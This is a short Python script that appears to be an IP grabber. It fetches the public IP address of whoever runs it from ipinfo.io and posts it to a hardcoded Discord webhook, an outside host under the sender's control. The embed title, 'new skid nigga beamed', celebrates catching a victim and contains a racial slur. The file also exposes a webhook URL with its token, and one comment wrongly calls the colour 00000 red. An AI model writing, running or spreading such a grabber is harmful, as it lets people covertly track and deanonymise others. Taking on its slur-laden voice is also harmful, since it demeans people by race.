import requests
import json

# Replace 'YOUR_WEBHOOK_URL' with the actual URL of your Discord webhook
webhook_url = 'https://discord.com/api/webhooks/1161328073527021598/cQEIIVmji9QVDulsXtemtRSLTnH7eqIDBw7JBxFk47ZkganOsYdQkhgQiQ2n_QE2_Eh5'

# Get the user's public IP address using an external service
response = requests.get('https://ipinfo.io')
data = response.json()
public_ip = data['ip']


embed = {
    "title": "new skid nigga beamed",
    "description": f"IP :  {public_ip}",
    "color": 00000,  # Hex color code (here, it's red)
}

# Create the main message object with the embed
message = {
    "content": "This message includes the user's public IP address.",
    "embeds": [embed],
}

# Convert the message to JSON format
message_json = json.dumps(message)

# Set the headers to specify that the content is JSON
headers = {'Content-Type': 'application/json'}

# Send a POST request to the webhook URL with the JSON data
response = requests.post(webhook_url, data=message_json, headers=headers)

print(response.status_code)  # Check the response status code for errors
